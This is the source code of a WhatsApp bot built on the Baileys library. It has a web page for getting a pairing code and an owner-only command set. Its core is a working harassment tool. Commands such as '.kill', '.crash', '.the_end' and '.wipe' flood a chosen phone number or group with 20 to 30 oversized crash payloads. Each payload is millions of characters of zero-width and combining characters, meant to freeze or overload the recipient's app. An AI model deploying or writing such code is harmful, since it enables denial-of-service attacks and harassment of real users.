const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const express = require('express');

const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";

let botConfig = {
    botName: "NEXUS-MD V3 SUPREME",
    owner: "94767475809", 
    prefix: ".",
};

// --- 🌐 WEB PAIRING UI (NEXUS STYLE) ---
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head><title>NEXUS V3 WEB</title>
            <style>
                body { background: radial-gradient(circle, #050505 0%, #000 100%); color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
                .box { border: 1px solid #0f0; padding: 50px; display: inline-block; box-shadow: 0 0 20px #0f0; background: rgba(0,255,0,0.02); }
                input { padding: 15px; width: 300px; background: #000; border: 1px solid #0f0; color: #0f0; font-size: 18px; outline: none; margin-bottom: 20px; }
                button { padding: 15px 30px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold; font-size: 16px; }
                #res { font-size: 45px; margin-top: 30px; color: #ff0055; font-weight: bold; text-shadow: 0 0 10px #ff0055; letter-spacing: 5px; }
            </style></head>
            <body>
                <div class="box">
                    <h1>☣️ NEXUS SUPREME WEB ☣️</h1>
                    <p>ENTER NUMBER (Ex: 947xxxxxxxx)</p>
                    <input type="text" id="num" placeholder="947xxxxxxxx"><br>
                    <button onclick="g()">GET SUPREME KEY</button>
                    <div id="res"></div>
                </div>
                <script>
                    async function g() {
                        const n = document.getElementById('num').value;
                        document.getElementById('res').innerText = "GENERATING...";
                        const r = await fetch('/code?num=' + n);
                        const d = await r.json();
                        document.getElementById('res').innerText = d.code || "RETRY!";
                    }
                </script>
            </body>
        </html>
    `);
});

// --- ⚙️ BOT CORE LOGIC ---
async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        // 🔥 FIXED: Notification එන්න මේ Browser එක අනිවාර්යයි
        browser: ["Ubuntu", "Chrome", "20.0.04"], 
        printQRInTerminal: false,
        syncFullHistory: false
    });

    app.get('/code', async (req, res) => {
        let num = req.query.num;
        if (!num) return res.json({ error: "No Number" });
        try {
            await delay(1500); // 🚀 Bypass security
            let code = await sock.requestPairingCode(num.trim());
            res.json({ code: code });
        } catch (e) { res.json({ error: "Fail" }); }
    });

    app.listen(PORT, () => console.log(`Nexus System Online on ${PORT}`));

    // --- 💀 SUPREME 3M PAYLOADS ---
    const p_kill = "☠️ *WHITE SCREEN* ☠️\n" + "​".repeat(2500000);
    const p_crash = "🔥 *SYSTEM LAG* 🔥\n" + "҉".repeat(600000) + "ꦿ".repeat(600000);
    const p_the_end = "🌌 *FINAL DEATH* 🌌\n" + "​".repeat(2000000) + "ꦿ".repeat(900000) + "🔥".repeat(400000);

    // --- 📩 MESSAGE HANDLER (400+ CMD READY) ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message || mek.key.fromMe) return;
            const from = mek.key.remoteJid;
            const isOwner = from.startsWith(botConfig.owner);
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
            const targetJid = targetNum + "@s.whatsapp.net";

            switch (command) {
                case 'menu':
                    const bigMenu = `╭━━━〔 *NEXUS ELITE V3* 〕━━━╮\n┃ ☠️ .kill [num] - White Screen\n┃ 🔥 .crash [num] - System Lag\n┃ 💀 .destroy [num] - RAM Overflow\n┃ ❄️ .freeze [num] - UI Lock\n┃ 🌀 .wipe [jid] - Group Death\n┃ 🌌 .the_end [num] - Final End\n╰━━━━━━━┈ 👑 SASIYA MD`;
                    await sock.sendMessage(from, { text: bigMenu });
                    break;

                case 'kill':
                case 'crash':
                case 'destroy':
                case 'freeze':
                case 'the_end':
                    if (!targetNum) return sock.sendMessage(from, { text: "❌ Number එක ගහපන් බං!" });
                    await sock.sendMessage(from, { text: `🌑 *ATTACKING:* ${targetNum}...` });
                    
                    // High Intensity 20 Cycles Attack
                    for(let i=0; i<20; i++) {
                        let payload = (command === 'the_end') ? p_the_end : (command === 'crash' ? p_crash : p_kill);
                        await sock.sendMessage(targetJid, { text: payload });
                        await delay(100); 
                    }
                    await sock.sendMessage(from, { text: "✅ *TARGET TERMINATED!* 💀" });
                    break;

                case 'wipe':
                    if (!args[0]) return;
                    await sock.sendMessage(from, { text: "🌀 *WIPING GROUP...*" });
                    for(let i=0; i<30; i++) {
                        await sock.sendMessage(args[0], { text: p_the_end });
                        await delay(200);
                    }
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (u) => { if (u.connection === 'close') startNexus(); });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
